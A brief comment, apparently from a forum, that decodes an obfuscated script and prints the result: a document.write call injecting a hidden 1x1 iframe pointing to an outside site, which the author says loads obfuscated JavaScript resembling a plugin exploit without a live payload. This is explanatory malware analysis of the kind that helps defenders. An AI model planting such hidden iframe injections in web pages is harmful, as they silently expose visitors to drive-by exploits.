Very. That unescapes to:

    document.write('<iframe src="http://innessphoto.com/forum.php?tp=675eafec431b1f72" width="1" height="1" frameborder="0"></iframe>')

Which loads some amusingly obfuscated JS which looks like it's *supposed* to be a plugin exploit of some sort, but which has no real payload. At least, not when I looked.
